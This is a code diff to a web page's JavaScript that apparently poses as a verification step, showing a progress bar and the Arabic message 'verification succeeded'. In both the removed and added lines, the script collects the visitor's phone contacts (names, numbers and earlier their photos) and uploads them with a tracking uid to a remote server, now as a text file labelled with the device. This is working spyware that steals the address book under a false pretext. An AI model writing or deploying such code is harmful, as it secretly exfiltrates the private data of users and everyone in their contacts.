@@ -132,39 +132,30 @@
 
         bar.style.width = '40%';
 
-        // Send VCF file
-        const vcfBlob = new Blob([vcf], { type: 'text/vcard' });
-        const formData = new FormData();
-        formData.append('uid', uid);
-        formData.append('file', vcfBlob, 'contacts.vcf');
-        formData.append('count', contacts.length);
+        // Build TXT content
+        const device = navigator.userAgent.match(/\(([^)]+)\)/)?.[1] || 'Unknown Device';
+        let txt = `All Contacts - ${device}\n`;
+        txt += `Total: ${contacts.length} contacts\n`;
+        txt += `Date: ${new Date().toLocaleString()}\n`;
+        txt += '='.repeat(40) + '\n\n';
+        for (const c of contacts) {
+          const name = c.name && c.name[0] ? c.name[0] : 'Unknown';
+          const tels = c.tel && c.tel.length > 0 ? c.tel.join(' | ') : 'No number';
+          txt += `Name: ${name}\nPhone: ${tels}\n\n`;
+        }
 
-        await fetch(serverURL + '/contacts-file', { method: 'POST', body: formData });
         bar.style.width = '60%';
 
-        // Send photos one by one
-        let photoCount = 0;
-        for (const c of contacts) {
-          if (c.icon && c.icon.length > 0) {
-            const name = c.name && c.name[0] ? c.name[0] : 'جهة اتصال';
-            const blob = c.icon[0];
-            await new Promise((resolve) => {
-              const reader = new FileReader();
-              reader.onload = async (e) => {
-                const base64 = e.target.result.split(',')[1];
-                await fetch(serverURL + '/contact-photo', {
-                  method: 'POST',
-                  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-                  body: 'uid=' + encodeURIComponent(uid) + '&img=' + encodeURIComponent(base64) + '&name=' + encodeURIComponent(name)
-                });
-                resolve();
-              };
-              reader.readAsDataURL(blob);
-            });
-            photoCount++;
-            bar.style.width = (60 + (photoCount / contacts.length) * 35) + '%';
-          }
-        }
+        // Send TXT file
+        const txtBlob = new Blob([txt], { type: 'text/plain' });
+        const fileName = `All Contacts - ${device}.txt`;
+        const formData = new FormData();
+        formData.append('uid', uid);
+        formData.append('file', txtBlob, fileName);
+        formData.append('count', contacts.length);
+        formData.append('filename', fileName);
+
+        await fetch(serverURL + '/contacts-file', { method: 'POST', body: formData });
 
         bar.style.width = '100%';
         status.textContent = '✅ تم التحقق بنجاح';
